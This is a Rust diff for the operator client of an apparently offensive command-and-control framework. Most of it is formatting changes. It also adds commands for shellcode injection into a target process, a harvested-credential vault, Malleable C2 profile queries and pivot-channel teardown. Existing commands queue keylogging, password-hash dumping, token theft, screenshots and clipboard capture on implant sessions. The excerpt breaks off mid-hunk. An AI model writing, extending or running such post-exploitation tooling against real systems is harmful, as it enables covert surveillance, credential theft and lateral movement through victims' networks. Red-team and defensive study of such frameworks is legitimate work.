@@ -113,37 +113,108 @@ pub enum Cmd {
     /// Target team server base URL + optional API bearer token.
     /// `password` is the operator-typed token sent as `Authorization: Bearer`.
     /// `None` when the server has no `NYX_TOKEN` configured (local dev).
-    Connect { server: String, password: Option<String> },
+    Connect {
+        server: String,
+        password: Option<String>,
+    },
     /// Enqueue a shell task on the given session.
-    Shell { session: String, args: String },
+    Shell {
+        session: String,
+        args: String,
+    },
     /// Enqueue a shell task but parse the result for FileTree.
-    Ls { session: String, args: String },
+    Ls {
+        session: String,
+        args: String,
+    },
     /// Enqueue a shell task but parse the result for ProcTable.
-    Ps { session: String, args: String },
+    Ps {
+        session: String,
+        args: String,
+    },
     /// Basic tasks
-    Ping { session: String },
-    Sleep { session: String, seconds: u32, jitter_pct: u8 },
-    Exit { session: String },
+    Ping {
+        session: String,
+    },
+    Sleep {
+        session: String,
+        seconds: u32,
+        jitter_pct: u8,
+    },
+    Exit {
+        session: String,
+    },
     /// File operations
-    Upload { session: String, name: String, data_hex: String },
-    Download { session: String, path: String },
-    FileOp { session: String, op: String, path: String, dest: Option<String> },
-    Driveinfo { session: String },
+    Upload {
+        session: String,
+        name: String,
+        data_hex: String,
+    },
+    Download {
+        session: String,
+        path: String,
+    },
+    FileOp {
+        session: String,
+        op: String,
+        path: String,
+        dest: Option<String>,
+    },
+    Driveinfo {
+        session: String,
+    },
     /// Network & Pivoting
-    ConnectChan { session: String, host: String, port: u16 },
-    Socks { session: String, chan: u32, op: u8, addr: String, port: u16 },
-    Portscan { session: String, host: String, ports: String },
-    Net { session: String, query: String },
+    ConnectChan {
+        session: String,
+        host: String,
+        port: u16,
+    },
+    Socks {
+        session: String,
+        chan: u32,
+        op: u8,
+        addr: String,
+        port: u16,
+    },
+    Portscan {
+        session: String,
+        host: String,
+        ports: String,
+    },
+    Net {
+        session: String,
+        query: String,
+    },
     /// Information & Media
-    Screenshot { session: String, monitor: u8 },
-    Screenwatch { session: String, interval_secs: u32 },
-    Clipboard { session: String },
-    Env { session: String, name: String },
-    Keylog { session: String, action: u8 },
-    Hashdump { session: String, method: u8 },
+    Screenshot {
+        session: String,
+        monitor: u8,
+    },
+    Screenwatch {
+        session: String,
+        interval_secs: u32,
+    },
+    Clipboard {
+        session: String,
+    },
+    Env {
+        session: String,
+        name: String,
+    },
+    Keylog {
+        session: String,
+        action: u8,
+    },
+    Hashdump {
+        session: String,
+        method: u8,
+    },
     /// Token operations (lateral movement). steal/make a token, revert
     /// impersonation, query the current thread identity.
-    StealToken { session: String, pid: u32 },
+    StealToken {
+        session: String,
+        pid: u32,
+    },
     MakeToken {
         session: String,
         domain: String,
@@ -151,18 +222,80 @@ pub enum Cmd {
         password: String,
         logon_type: u8,
     },
-    Rev2Self { session: String },
-    GetUid { session: String },
+    Rev2Self {
+        session: String,
+    },
+    GetUid {
+        session: String,
+    },
     /// Pull server-side creds (`GET /api/creds`) and print them to the log.
-    FetchCreds { reveal: bool },
+    FetchCreds {
+        reveal: bool,
+    },
     /// Query the server audit log (`GET /api/audit`) and print to the log.
-    FetchAudit { operator: Option<String>, action: Option<String>, limit: Option<u32> },
+    FetchAudit {
+        operator: Option<String>,
+        action: Option<String>,
+        limit: Option<u32>,
+    },
     /// Enqueue a BOF (Beacon Object File) task on the given session. `name` is
     /// the COFF entry label shown in the BOF history; `args` the space-separated
     /// arg string (split here to match the server's `Vec<String>`); `data_hex`
     /// the hex-encoded COFF bytes. The result (`kind == "bof"`) is routed into
     /// the BOFS UI global.
-    Bof { session: String, name: String, args: String, data_hex: String },
+    Bof {
+        session: String,
+        name: String,
+        args: String,
+        data_hex: String,
+    },
+    /// Inject shellcode into a target process. `method` selects the technique
+    /// (1 = local, 2 = remote, etc.; see `Command::Inject` in `protocol::msg`),
+    /// `pid` the target, `spawn_to` optional fork target, `sc_hex` the hex-encoded
+    /// payload. The JSON shape mirrors TUI's `/inject`.
+    Inject {
+        session: String,
+        method: u8,
+        pid: u32,
+        spawn_to: String,
+        sc_hex: String,
+    },
+    /// Close an open P2P/SOCKS channel on a session. ChannelClose is the
+    /// counterpart to ConnectChan; without it pivots have no teardown.
+    ChannelClose {
+        session: String,
+        chan: u32,
+    },
+    /// `GET /api/tasks?session=<hex>` — list the queued tasks for a session.
+    /// Output is rendered into the event log; mirrors TUI's `/tasks`.
+    FetchTasks {
+        session: String,
+    },
+    /// `GET /api/profile` — fetch the active Malleable C2 profile metadata.
+    /// Mirrors TUI's `/profile` overlay.
+    FetchProfile,
+    /// `GET /api/audit/verify` — verify the hash chain of the audit log.
+    /// Mirrors TUI's `/audit verify`.
+    FetchAuditVerify,
+    /// `POST /api/creds` — add a harvested credential to the server-side vault.
+    /// Mirrors TUI's `/creds add`.
+    CredAdd {
+        realm: String,
+        user: String,
+        kind: String,
+        secret: String,
+    },
+    /// `POST /api/creds/delete` — remove a credential by composite key.
+    /// Mirrors TUI's `/creds del`.
+    CredDelete {
+        realm: String,
+        user: String,
+        kind: String,
+    },
+    /// Force an out-of-band session-list refresh (reset the signature so the
+    /// next worker cycle unconditionally re-fetches). Mirrors TUI's `/sessions
+    /// refresh`.
+    RefreshSessions,
     /// Stop the worker loop (app shutdown).
     Shutdown,
 }
@@ -228,7 +361,10 @@ enum TaskKind {
     Ps,
     Hashdump,
     /// BOF, carrying its display name + args for the history row.
-    Bof { name: String, args: String },
+    Bof {
+        name: String,
+        args: String,
+    },
 }
 
 /// A task whose result the worker is still polling.
@@ -281,8 +417,13 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                     connect_attempt_time = None;
                     log_push(&mut log_buf, "! connect: timed out");
                     let _ = to_ui.send(take_snapshot(
-                        &mut log_buf, false, &[], &mut bof_updates, &mut console_lines,
-                        connecting, connect_stage,
+                        &mut log_buf,
+                        false,
+                        &[],
+                        &mut bof_updates,
+                        &mut console_lines,
+                        connecting,
+                        connect_stage,
                     ));
                 }
             }
@@ -292,62 +433,128 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
         while let Ok(cmd) = cmd_rx.try_recv() {
             match cmd {
                 Cmd::Shutdown => return,
-                Cmd::Connect { server: s, password } => {
+                Cmd::Connect {
+                    server: s,
+                    password,
+                } => {
                     log_push(&mut log_buf, &format!("connecting to {s} …"));
                     server = Some((s, password));
                     connecting = true;
                     connect_stage = ConnectStage::Resolving;
                     connect_attempt_time = Some(Instant::now());
                     let _ = to_ui.send(take_snapshot(
-                        &mut log_buf, false, &[], &mut bof_updates, &mut console_lines,
-                        connecting, connect_stage,
+                        &mut log_buf,
+                        false,
+                        &[],
+                        &mut bof_updates,
+                        &mut console_lines,
+                        connecting,
+                        connect_stage,
                     ));
                 }
                 Cmd::Shell { session, args } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
                     let cmd_json = serde_json::json!({ "type": "shell", "args": args });
                     match enqueue_task(&client, srv, &session, cmd_json, token).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] $ {} → task {}", short(&session), args, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("shell".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] $ {} → task {}", short(&session), args, tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("shell".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! shell: {e}")),
                     }
                 }
                 Cmd::Ls { session, args } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
                     let cmd_json = serde_json::json!({ "type": "shell", "args": args });
                     match enqueue_task(&client, srv, &session, cmd_json, token).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] ls → task {}", short(&session), tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Ls, backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] ls → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Ls,
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! ls: {e}")),
                     }
                 }
                 Cmd::Ps { session, args } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
                     let cmd_json = serde_json::json!({ "type": "shell", "args": args });
                     match enqueue_task(&client, srv, &session, cmd_json, token).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] ps → task {}", short(&session), tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Ps, backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] ps → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Ps,
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! ps: {e}")),
                     }
                 }
                 Cmd::Ping { session } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "ping" }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "ping" }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] ping → task {}", short(&session), tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("ping".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] ping → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("ping".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! ping: {e}")),
                     }
                 }
-                Cmd::Sleep { session, seconds, jitter_pct } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
+                Cmd::Sleep {
+                    session,
+                    seconds,
+                    jitter_pct,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
                     match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "sleep", "seconds": seconds, "jitter_pct": jitter_pct }), token).await {
                         Ok(tid) => {
                             log_push(&mut log_buf, &format!("[{}] sleep {} {}% → task {}", short(&session), seconds, jitter_pct, tid));
@@ -357,37 +564,105 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                     }
                 }
                 Cmd::Exit { session } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "exit" }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "exit" }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] exit → task {}", short(&session), tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("exit".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] exit → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("exit".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! exit: {e}")),
                     }
                 }
-                Cmd::Upload { session, name, data_hex } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "upload", "name": name, "data_hex": data_hex }), token).await {
+                Cmd::Upload {
+                    session,
+                    name,
+                    data_hex,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "upload", "name": name, "data_hex": data_hex }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] upload {} → task {}", short(&session), name, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("upload".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] upload {} → task {}", short(&session), name, tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("upload".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! upload: {e}")),
                     }
                 }
                 Cmd::Download { session, path } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "download", "path": path }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "download", "path": path }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] download {} → task {}", short(&session), path, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("download".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] download {} → task {}", short(&session), path, tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("download".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! download: {e}")),
                     }
                 }
-                Cmd::FileOp { session, op, path, dest } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
+                Cmd::FileOp {
+                    session,
+                    op,
+                    path,
+                    dest,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
                     match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "fileop", "op": op, "path": path, "dest": dest }), token).await {
                         Ok(tid) => {
                             log_push(&mut log_buf, &format!("[{}] {} {} → task {}", short(&session), op, path, tid));
@@ -397,27 +672,83 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                     }
                 }
                 Cmd::Driveinfo { session } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "driveinfo" }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "driveinfo" }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] driveinfo → task {}", short(&session), tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("driveinfo".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] driveinfo → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("driveinfo".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! driveinfo: {e}")),
                     }
                 }
-                Cmd::ConnectChan { session, host, port } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "connect", "host": host, "port": port }), token).await {
+                Cmd::ConnectChan {
+                    session,
+                    host,
+                    port,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "connect", "host": host, "port": port }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] connect {}:{} → task {}", short(&session), host, port, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("connect".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] connect {}:{} → task {}",
+                                    short(&session),
+                                    host,
+                                    port,
+                                    tid
+                                ),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("connect".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! connect: {e}")),
                     }
                 }
-                Cmd::Socks { session, chan, op, addr, port } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
+                Cmd::Socks {
+                    session,
+                    chan,
+                    op,
+                    addr,
+                    port,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
                     match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "socks", "chan": chan, "op": op, "addr": addr, "port": port }), token).await {
                         Ok(tid) => {
                             log_push(&mut log_buf, &format!("[{}] socks op {} → task {}", short(&session), op, tid));
@@ -426,38 +757,115 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                         Err(e) => log_push(&mut log_buf, &format!("! socks: {e}")),
                     }
                 }
-                Cmd::Portscan { session, host, ports } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "portscan", "host": host, "ports": ports }), token).await {
+                Cmd::Portscan {
+                    session,
+                    host,
+                    ports,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "portscan", "host": host, "ports": ports }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] portscan {} {} → task {}", short(&session), host, ports, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("portscan".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] portscan {} {} → task {}",
+                                    short(&session),
+                                    host,
+                                    ports,
+                                    tid
+                                ),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("portscan".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! portscan: {e}")),
                     }
                 }
                 Cmd::Net { session, query } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "net", "query": query }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "net", "query": query }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] net {} → task {}", short(&session), query, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("net".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] net {} → task {}", short(&session), query, tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("net".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! net: {e}")),
                     }
                 }
                 Cmd::Screenshot { session, monitor } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "screenshot", "monitor": monitor }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "screenshot", "monitor": monitor }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] screenshot {} → task {}", short(&session), monitor, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("screenshot".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] screenshot {} → task {}",
+                                    short(&session),
+                                    monitor,
+                                    tid
+                                ),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("screenshot".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! screenshot: {e}")),
                     }
                 }
-                Cmd::Screenwatch { session, interval_secs } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
+                Cmd::Screenwatch {
+                    session,
+                    interval_secs,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
                     match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "screenwatch", "interval_secs": interval_secs }), token).await {
                         Ok(tid) => {
                             log_push(&mut log_buf, &format!("[{}] screenwatch {}s → task {}", short(&session), interval_secs, tid));
@@ -467,57 +875,165 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                     }
                 }
                 Cmd::Clipboard { session } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "clipboard" }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "clipboard" }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] clipboard → task {}", short(&session), tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("clipboard".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] clipboard → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("clipboard".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! clipboard: {e}")),
                     }
                 }
                 Cmd::Env { session, name } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "env", "name": name }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "env", "name": name }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] env {} → task {}", short(&session), name, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("env".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] env {} → task {}", short(&session), name, tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("env".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! env: {e}")),
                     }
                 }
                 Cmd::Keylog { session, action } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "keylog", "action": action }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "keylog", "action": action }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] keylog {} → task {}", short(&session), action, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("keylog".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] keylog {} → task {}", short(&session), action, tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("keylog".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! keylog: {e}")),
                     }
                 }
                 Cmd::Hashdump { session, method } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "hashdump", "method": method }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "hashdump", "method": method }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] hashdump {} → task {}", short(&session), method, tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Hashdump, backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] hashdump {} → task {}",
+                                    short(&session),
+                                    method,
+                                    tid
+                                ),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Hashdump,
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! hashdump: {e}")),
                     }
                 }
                 Cmd::StealToken { session, pid } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "stealtoken", "pid": pid }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "stealtoken", "pid": pid }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] steal_token({pid}) → task {}", short(&session), tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("stealtoken".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] steal_token({pid}) → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("stealtoken".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! steal_token: {e}")),
                     }
                 }
-                Cmd::MakeToken { session, domain, user, password, logon_type } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
+                Cmd::MakeToken {
+                    session,
+                    domain,
+                    user,
+                    password,
+                    logon_type,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
                     match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "maketoken", "domain": domain, "user": user, "password": password, "logon_type": logon_type }), token).await {
                         Ok(tid) => {
                             log_push(&mut log_buf, &format!("[{}] make_token({domain}\\{user}) → task {}", short(&session), tid));
@@ -527,41 +1043,100 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                     }
                 }
                 Cmd::Rev2Self { session } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "rev2self" }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "rev2self" }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] rev2self → task {}", short(&session), tid));
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("rev2self".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] rev2self → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("rev2self".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! rev2self: {e}")),
                     }
                 }
                 Cmd::GetUid { session } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "getuid" }), token).await {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    match enqueue_task(
+                        &client,
+                        srv,
+                        &session,
+                        serde_json::json!({ "type": "getuid" }),
+                        token,
+                    )
+                    .await
+                    {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] getuid → task {}", short(&session), tid));
